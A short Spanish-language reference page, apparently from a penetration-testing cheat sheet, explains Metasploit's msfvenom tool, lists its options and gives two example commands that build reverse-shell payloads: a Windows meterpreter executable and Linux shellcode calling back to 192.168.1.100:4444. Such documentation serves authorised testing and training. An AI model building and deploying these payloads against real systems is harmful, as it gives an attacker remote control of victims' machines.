### **Explotación/Generación de Payloads/msfvenom.md**

# msfvenom

## Descripción

`msfvenom` es una herramienta utilizada para generar payloads personalizados que pueden ser utilizados en pruebas de penetración. Forma parte del framework Metasploit y permite crear ejecutables maliciosos para diversas plataformas.

## Uso

```bash
msfvenom [opciones]
```

### Opciones principales

- `-p`: Especifica el payload a utilizar.
- `-a`: Define la arquitectura (x86, x64).
- `--platform`: Especifica la plataforma objetivo (Windows, Linux).
- `-e`: Utiliza un encoder para el payload.
- `-i`: Número de iteraciones de encoding.
- `-f`: Formato de salida (exe, elf, raw).
- `-o`: Archivo de salida.
- `LHOST`: Dirección IP para conectar de regreso.
- `LPORT`: Puerto para conectar de regreso.

## Ejemplos

- Generar un payload reverse TCP para Windows:

  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
  ```

- Generar un shellcode en formato c:

  ```bash
  msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c
  ```
